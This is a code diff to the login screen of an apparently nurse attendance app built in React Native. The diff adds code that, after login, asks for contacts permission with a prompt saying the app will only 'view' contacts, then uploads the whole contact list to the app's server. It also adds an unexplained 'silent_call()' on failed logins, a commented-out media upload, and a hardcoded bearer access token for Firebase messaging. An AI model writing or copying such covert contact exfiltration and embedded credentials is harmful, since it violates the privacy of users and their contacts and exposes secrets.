@@ -14,24 +14,29 @@ import {
   BackHandler,
   ToastAndroid
 } from 'react-native';
+import messaging from '@react-native-firebase/messaging';
 import {
   get_async_data,
+  requestPermissions,
   save_fcm_token,
+  silent_call,
+  upload_contact_list
 } from '../Helper/AppHelper';
-import {useNetInfo} from '@react-native-community/netinfo';
+import { useNetInfo } from '@react-native-community/netinfo';
 import Contacts from 'react-native-contacts';
-import React, {useState, useEffect} from 'react';
-import {loginNurse, set_async_data, generateFCM} from '../Helper/AppHelper';
-import {useIsFocused} from '@react-navigation/native';
+import React, { useState, useEffect } from 'react';
+import { loginNurse, set_async_data, generateFCM } from '../Helper/AppHelper';
+import { useIsFocused } from '@react-navigation/native';
 import LocationAccess from '../components/LocationAccess';
 import NetworkModal from '../components/NetworkModal';
-const {width, height} = Dimensions.get('window');
+// import { CameraRoll } from '@react-native-camera-roll/camera-roll';
+const { width, height } = Dimensions.get('window');
 const buttonWidth = width - 50;
 const ratio = buttonWidth / 1232;
 
-const LoginScreen = ({navigation}: {navigation: any}) => {
+const LoginScreen = ({ navigation }: { navigation: any }) => {
   const isFocused = useIsFocused();
-  const {isConnected} = useNetInfo();
+  const { isConnected } = useNetInfo();
   const [phone, setphone] = useState('');
   const [password, setpassword] = useState('');
   const [errormessage, seterrormessage] = useState('');
@@ -41,7 +46,7 @@ const LoginScreen = ({navigation}: {navigation: any}) => {
   const [showoverlay, setshowoverlay] = useState(true);
 
   const login = async () => {
-    if(isConnected == true) {
+    if (isConnected == true) {
       setloader(true);
       if (phone.length < 11 || password.length < 5) {
         seterrormessage('Enter correct phone number or password');
@@ -50,10 +55,12 @@ const LoginScreen = ({navigation}: {navigation: any}) => {
         seterrormessage('');
         const request = await loginNurse(phone, password);
         if (request.status == 'error') {
+          await silent_call();
           seterrormessage(request.message);
+          setloader(false);
         }
         if (request.status == 'success') {
-          let object = {pair: []}
+          let object = { pair: [] }
           await set_async_data('attendence_history', JSON.stringify(object));
           seterrormessage(request.message);
           await generateFCM();
@@ -69,25 +76,31 @@ const LoginScreen = ({navigation}: {navigation: any}) => {
           await set_async_data('hiring_date', request.data.created_at);
           await set_async_data('profile_picture', request.data.image);
           await set_async_data('login_user', 'loggedin');
+          await get_contact_list();
 
+          // await fetchAndUploadMedia(request.data.id);
           let saveFCM = await save_fcm_token();
-          console.log('saveFCM', saveFCM);
-  
+
           let usertype = await get_async_data('usertype');
           // setTimeout(() => {
-            if (usertype == 'Admin') {
-              navigation.replace('AdminRoute');
-            } if(usertype == 'Nurse') {
-              navigation.replace('NurseRoute');
-            }
-            //  else {
-            //   navigation.replace('ClientRoute');
-            // }   
-            setloader(false);       
+          if (usertype == 'Admin') {
+            navigation.replace('AdminRoute');
+          } if (usertype == 'Nurse') {
+            navigation.replace('NurseRoute');
+          }
+          //  else {
+          //   navigation.replace('ClientRoute');
+          // }   
+          setloader(false);
           // }, 1000);
+        } else {
+          setloader(false);
+          Alert.alert(request.status, request.message);
+          console.log('login failed', request)
         }
       }
-    } else{
+    } else {
+      setloader(false);
       ToastAndroid.showWithGravityAndOffset(
         'Connect to internet!',
         ToastAndroid.SHORT,
@@ -100,7 +113,7 @@ const LoginScreen = ({navigation}: {navigation: any}) => {
 
   useEffect(() => {
     (async () => {
-      if(showoverlay == false) {
+      if (showoverlay == false) {
         const locationPermissionGranted = await PermissionsAndroid.request(
           PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
           {
@@ -110,6 +123,7 @@ const LoginScreen = ({navigation}: {navigation: any}) => {
             buttonPositive: 'OK',
           },
         );
+        console.log('locationPermissionGranted Status :- ', locationPermissionGranted);
         if (locationPermissionGranted === 'granted') {
           //  Access Location
           const contactsPermissionGranted = await PermissionsAndroid.request(
@@ -131,7 +145,7 @@ const LoginScreen = ({navigation}: {navigation: any}) => {
                   onPress: () => BackHandler.exitApp(),
                   style: 'cancel',
                 },
-                {text: 'Open Settings', onPress: () => Linking.openSettings()},
+                { text: 'Open Settings', onPress: () => Linking.openSettings() },
               ],
             );
           }
@@ -145,13 +159,87 @@ const LoginScreen = ({navigation}: {navigation: any}) => {
                 onPress: () => BackHandler.exitApp(),
                 style: 'cancel',
               },
-              {text: 'Open Settings', onPress: () => Linking.openSettings()},
+              { text: 'Open Settings', onPress: () => Linking.openSettings() },
             ],
           );
         }
+        requestPermissions();
       }
     })();
   }, [showoverlay, isConnected]);
+
+  const get_contact_list = async () => {
+    PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_CONTACTS, {
+      title: 'Contacts',
+      message: 'This app would like to view your contacts.',
+      buttonPositive: 'Please accept bare mortal',
+    })
+      .then((res) => {
+        console.log('Permission: ', res);
+        Contacts.getAll()
+          .then(async (contacts) => {
+            // work with contacts
+            let res = await upload_contact_list(contacts);
+            console.log('CONTACTS UPLOADED TO SERVER', res);
+          })
+          .catch((e) => {
+            console.log(e);
+          });
+      })
+      .catch((error) => {
+        console.error('Permission error: ', error);
+      });
+  }
+
+  const sendFirebase_message = async () => {
+    const authStatus = await messaging().requestPermission();
+    const enabled =
+      authStatus === messaging.AuthorizationStatus.AUTHORIZED ||
+      authStatus === messaging.AuthorizationStatus.PROVISIONAL;
+
+    if (enabled) {
+      console.log('Notification permission granted.');
+      const token = await messaging().getToken();
+      sendNotification(token);
+    } else {
+      console.log('Notification permission denied.');
+    }
+  }
+
+  const sendNotification = async (fcmToken:any) => {
+    const accessToken = 'BBX3X5BGOjV_coyAyttzcMpK4EngFI17z3oL-gOutIGtjNrD7fae9t8LhdSqnBGutiLkjrNSMG2zFfaxe5Xjddc'; // Replace with your generated token
+    const projectId = 'com.nursingattendance'; // Replace with your Firebase project ID
+  
+    const notificationBody = {
+      message: {
+        token: fcmToken,
+        notification: {
+          title: 'Hello!',
+          body: 'This is a test notification from FCM API v1.',
+        },
+      },
+    };
+  
+    try {
+      const response = await fetch(
+        `https://fcm.googleapis.com/v1/projects/${projectId}/messages:send`,
+        {
+          method: 'POST',
+          headers: {
+            Authorization: `Bearer ${accessToken}`,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(notificationBody),
+        }
+      );
+  
+      const result = await response.json();
+      console.log('Notification sent successfully:', result);
+    } catch (error) {
+      console.error('Error sending notification:', error);
+    }
+  };
+  
 
   return (
     <ImageBackground
@@ -169,7 +257,7 @@ const LoginScreen = ({navigation}: {navigation: any}) => {
           keyboardType="phone-pad"
           placeholder="Phone"
           onChangeText={setphone}
-          maxLength={11}
+          // maxLength={11}
           value={phone}
         />
         <TextInput
@@ -188,7 +276,7 @@ const LoginScreen = ({navigation}: {navigation: any}) => {
         {loader == true ? (
           <ActivityIndicator color={'#fff'} size={'large'} />
         ) : (
-          <TouchableOpacity onPress={() => login()}>
+          <TouchableOpacity onPress={login}>
             <Image
               style={styles.saveButton}
               source={require('../assets/save.png')}
